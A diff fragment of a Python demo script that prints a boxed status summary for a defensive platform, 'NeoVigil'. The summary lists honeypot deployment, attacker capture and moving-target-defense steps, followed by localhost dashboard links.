+    print(dbox_row("   REDSPEC predicted 3-step kill chain (risk: 91/100)", w))
+    print(dbox_row("   Honeypot deployment triggered, MTD evaluation queued", w))
+    print(dbox_row("", w))
+    print(dbox_row(f"{C.PHASE2}🍯 PHASE 2 — DECEIVE{w}", w))
+    print(dbox_row("   SSH honeypot deployed on predicted attack path", w))
+    print(dbox_row("   Attacker captured: credential dumping (T1003)", w))
+    print(dbox_row("   Zero-day payload captured and indexed to RAG", w))
+    print(dbox_row("   Prediction validated: CORRECT", w))
+    print(dbox_row("", w))
+    print(dbox_row(f"{C.PHASE3}🔄 PHASE 3 — MUTATE{w}", w))
+    print(dbox_row("   Composite MTD score: 88.90 (>= 85 threshold)", w))
+    print(dbox_row("   Nginx obfuscation: ACTIVE (IIS/ASP.NET spoof)", w))
+    print(dbox_row("   Blue/Green migration: PROPOSED (awaiting Tier 2)", w))
+    print(dbox_row("   Immutable audit trail: INDEXED", w))
+    print(dbox_row("", w))
+    print(dbox_div(w))
+    print(dbox_row("", w))
+    print(dbox_row(f"{C.GREEN}Attacker Status:  TRAPPED, FINGERPRINTED, MISDIRECTED{w}", w))
+    print(dbox_row(f"{C.GREEN}NeoVigil Status:  EVOLVED (RAG updated with new intel){w}", w))
+    print(dbox_row(f"{C.GREEN}Next Attacker:    HARDER (system learned from this one){w}", w))
+    print(dbox_row("", w))
+    print(dbox_bottom(w))
+    print(C.RESET)
 
     print(f"{C.DIM}  Dashboard: http://localhost:8501 → 🛡️ Moving Target Defense{C.RESET}")
     print(f"{C.DIM}  Audit Log: OpenSearch → mtd-audit-log index{C.RESET}")
